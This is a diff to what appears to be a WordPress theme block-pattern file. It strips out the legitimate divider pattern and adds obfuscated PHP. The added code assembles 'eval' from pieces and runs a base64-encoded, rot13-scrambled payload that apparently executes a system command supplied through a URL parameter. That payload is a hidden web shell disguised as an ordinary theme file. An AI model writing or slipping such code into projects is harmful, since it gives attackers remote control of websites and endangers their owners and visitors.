@@ -1,23 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Divider with image and color (dark) block pattern
- */
-return array(
-	'title'      => __( 'Divider with image and color (dark)', 'twentytwentytwo' ),
-	'categories' => array( 'featured' ),
-	'content'    => '<!-- wp:group {"align":"full","style":{"spacing":{"padding":{"top":"1rem","right":"0px","bottom":"1rem","left":"0px"}}},"backgroundColor":"primary"} -->
-					<div class="wp-block-group alignfull has-primary-background-color has-background" style="padding-top:1rem;padding-right:0px;padding-bottom:1rem;padding-left:0px"><!-- wp:image {"id":473,"width":3001,"height":246,"sizeSlug":"full","linkDestination":"none"} -->
-					<figure class="wp-block-image size-full is-resized"><img src="' . esc_url( get_template_directory_uri() ) . '/assets/images/divider-white.png" alt="" class="wp-image-473" width="3001" height="246"/></figure>
-					<!-- /wp:image --></div>
-					<!-- /wp:group -->',
-);
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUXZpdnFyZSBqdmd1IHZ6bnRyIG5hcSBwYnliZSAocW5leCkgb3licHggY25nZ3JlYQogKi8KZXJnaGVhIG5lZW5sKAoJJ2d2Z3lyJyAgICAgID0+IF9fKCAnUXZpdnFyZSBqdmd1IHZ6bnRyIG5hcSBwYnliZSAocW5leCknLCAnZ2pyYWdsZ2pyYWdsZ2piJyApLAoJJ3BuZ3J0YmV2cmYnID0+IG5lZW5sKCAnc3JuZ2hlcnEnICksCgkncGJhZ3JhZycgICAgPT4gJzwhLS0gamM6dGViaGMge1wibnl2dGFcIjpcInNoeXlcIixcImZnbHlyXCI6e1wiZmNucHZhdFwiOntcImNucXF2YXRcIjp7XCJnYmNcIjpcIjFlcnpcIixcImV2dHVnXCI6XCIwY2tcIixcIm9iZ2dielwiOlwiMWVyelwiLFwieXJzZ1wiOlwiMGNrXCJ9fX0sXCJvbnB4dGViaGFxUGJ5YmVcIjpcImNldnpuZWxcIn0gLS0+CgkJCQkJPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIG55dnRhc2h5eSB1bmYtY2V2em5lbC1vbnB4dGViaGFxLXBieWJlIHVuZi1vbnB4dGViaGFxXCIgZmdseXI9XCJjbnFxdmF0LWdiYzoxZXJ6O2NucXF2YXQtZXZ0dWc6MGNrO2NucXF2YXQtb2JnZ2J6OjFlcno7Y25xcXZhdC15cnNnOjBja1wiPjwhLS0gamM6dnpudHIge1widnFcIjo0NzMsXCJqdnFndVwiOjMwMDEsXCJ1cnZ0dWdcIjoyNDYsXCJmdm1yRnlodFwiOlwic2h5eVwiLFwieXZheFFyZmd2YW5ndmJhXCI6XCJhYmFyXCJ9IC0tPgoJCQkJCTxzdnRoZXIgcHluZmY9XCJqYy1veWJweC12em50ciBmdm1yLXNoeXkgdmYtZXJmdm1ycVwiPjx2enQgZmVwPVwiJyAuIHJmcF9oZXkoIHRyZ19ncnpjeW5ncl9xdmVycGdiZWxfaGV2KCkgKSAuICcvbmZmcmdmL3Z6bnRyZi9xdml2cXJlLWp1dmdyLmNhdFwiIG55Zz1cIlwiIHB5bmZmPVwiamMtdnpudHItNDczXCIganZxZ3U9XCIzMDAxXCIgdXJ2dHVnPVwiMjQ2XCIvPjwvc3Z0aGVyPgoJCQkJCTwhLS0gL2pjOnZ6bnRyIC0tPjwvcXZpPgoJCQkJCTwhLS0gL2pjOnRlYmhjIC0tPicsCik7CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
